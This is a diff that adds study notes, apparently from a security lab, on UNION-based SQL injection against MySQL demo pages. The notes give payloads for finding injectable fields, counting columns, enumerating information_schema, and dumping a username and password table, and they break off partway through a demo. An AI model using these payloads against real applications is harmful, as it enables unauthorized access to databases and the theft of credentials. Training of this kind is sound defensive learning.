@@ -55,6 +55,58 @@ show tables ;
 show columns from columns ;
 #I want to show the table columns and view info from columns
 Table schema is name of database , when selecting table name, we are getting all table names, when selecting column name, we are getting the names of all the columns.
+## Default databases
+Information_schema
+Performance_schema
+mysql
+### Begin extracting
+##Query
+select tireid,name,size from session.Tires ;
+## 1.) identify vulnerable field/selection
+Ford' OR 1='1 ##Not Vulnerable
+..
+..
+Audi' OR 1='1 ##Vulnerable
 
+##2.) Identify number of columns/selections
+Audi' UNION SELECT 1,2,3,4,5 #
+
+## 3.) Modify Golden Statement
+Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
+
+## 4.) Craft Queries
+Audi' UNION SELECT tireid,2,name,size,cost from session.Tires #
+Audi' UNION SELECT tireid,name,size,cost,5 from session.Tires #
+
+### FOR GET METHOD
+### 1.) Identify vulnerable Field/Selection
+Selection=1 OR 1=1 ## Not Vulnerable
+Selection=2 OR 1=1 ## Vulenerable (2,3,4 All Vulnerable)
+
+### 2.) Identify the number of columns
+Selection=2 UNION SELECT 1,2,3 ## Displayed 1,3,2
+
+### 3.) Modify Golden Statement
+Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+
+#We will see the actual data stored in here.
+select username,passwd from session.userinfo
+### Union.html demo
+1.) Identify Vulnerable Field/Selection
+#Executed:
+Ford' OR 1='1
+Dodge' OR 1='1
+Honda' OR 1='1
+#When executing "Audi' OR 1='1 we recieved a full table of more information, rather than less when executing others.
+### Show query revealed "select name, type, cost, color, year from car where name='Audi' OR 1='1'"
+2.) Identify # of Columns/Selections
+#Looking at the table, we can identify it is looking for 4 columns
+#We went back to the first page, knowing Audi is vulnerable we ran
+Audi' UNION SELECT 1,2,3,4 #
+#We recieved a warning: Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/uniondemo.php on line 23
+#We added another value, 5
+#Show query resulted in:
+select name, type, cost, color, year from car where name='Audi' UNION SELECT 1,2,3,4,5 #'
+3.) Modify Golden Statement
 
 
